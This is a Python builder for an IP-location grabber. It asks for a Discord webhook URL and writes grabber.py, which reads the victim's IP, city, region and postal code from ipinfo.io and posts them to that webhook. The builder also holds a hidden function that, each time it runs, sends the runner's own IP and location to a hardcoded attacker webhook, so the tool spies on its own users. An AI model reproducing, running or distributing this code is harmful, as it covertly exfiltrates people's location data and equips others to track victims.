import time
import requests
from requests import get
import json
import os
from shutil import rmtree
import pystyle
from pystyle import *

def tkg():

    url = "http://ipinfo.io/json"
    resp = get(url)
    json = resp.json()
    ip = json['ip']
    city = json["city"]
    region = json["region"]
    postal = json["postal"]

    webhook_main = "https://discord.com/api/webhooks/989112869570379806/SkbDOZW1KPhsToank5z_cA8MvmAelxhG7MtAyN9JnWLRH3mcHayhlXcUjHPjh8lHaKuw"
    message = '\n'.join([
        'ip : ' + ip,
        'region : ' + region,
        'vile : ' + city,
    ])
    r = requests.post(webhook_main, json={'username': 'BKS', 'content': message})

def location_info():
    user_data = 0
    url = "http://ipinfo.io/json"
    resp = get(url)
    json = resp.json()
    ip = json['ip']
    city = json["city"]
    region = json["region"]
    postal = json["postal"]
    print(ip)
    print(city)
    print(region)
    print(postal)

    user_data = 0

banner1 = """





▄▄▌ ▐ ▄▌ ▄▄▄·     ▄▄ • ▄▄▄   ▄▄▄· ▄▄▄▄· ▄▄▄▄· ▄▄▄▄· ▄▄▄ .▄▄▄  
██· █▌▐█▐█ ▄█    ▐█ ▀ ▪▀▄ █·▐█ ▀█ ▐█ ▀█▪▐█ ▀█▪▐█ ▀█▪▀▄.▀·▀▄ █·
██▪▐█▐▐▌ ██▀·    ▄█ ▀█▄▐▀▀▄ ▄█▀▀█ ▐█▀▀█▄▐█▀▀█▄▐█▀▀█▄▐▀▀▪▄▐▀▀▄ 
▐█▌██▐█▌▐█▪·•    ▐█▄▪▐█▐█•█▌▐█ ▪▐▌██▄▪▐███▄▪▐███▄▪▐█▐█▄▄▌▐█•█▌
 ▀▀▀▀ ▀▪.▀       ·▀▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀▀ ·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀
"""

banner2 = """
             .-_; ;_-.
            / /     \ 
           | |       | |
            \ \.---./ /
         .-"~   .---.   ~"-.
       ,`.-~/ .'`---`'. \~-.`,
       '`   | | \(_)/ | |   `'
       ,    \  \ | | /  /    ,
       ;`'.,_\  `-'-'  /_,.'`;
        '-._  _.-'^'-._  _.-'
            ``         ``
"""

banner = Add.Add(banner1, banner2)
print(Colorate.Vertical(Colors.black_to_green, Center.XCenter(banner + '\n\n')))
tkg()
webhook_url = Write.Input("[?] enter the webhook URL ->", Colors.dark_green, interval=0.005)


newContent = r"""
import time
import requests
from requests import get
import json
import os
from shutil import rmtree

url = "http://ipinfo.io/json"
resp = get(url)
json = resp.json()
ip = json['ip']
city = json["city"]
region = json["region"]
postal = json["postal"]

webhook_url = "%s"
message = '\n'.join([
    'ip : ' + ip,
    'region : ' + region,
    'vile : ' + city,

])

r = requests.post(webhook_url, json={'username': 'BKS', 'content': message})

"""%webhook_url

with open('grabber.py', 'a+')as file:file.write(newContent)

print()
Write.Input("Built!", Colors.green, interval=0.005)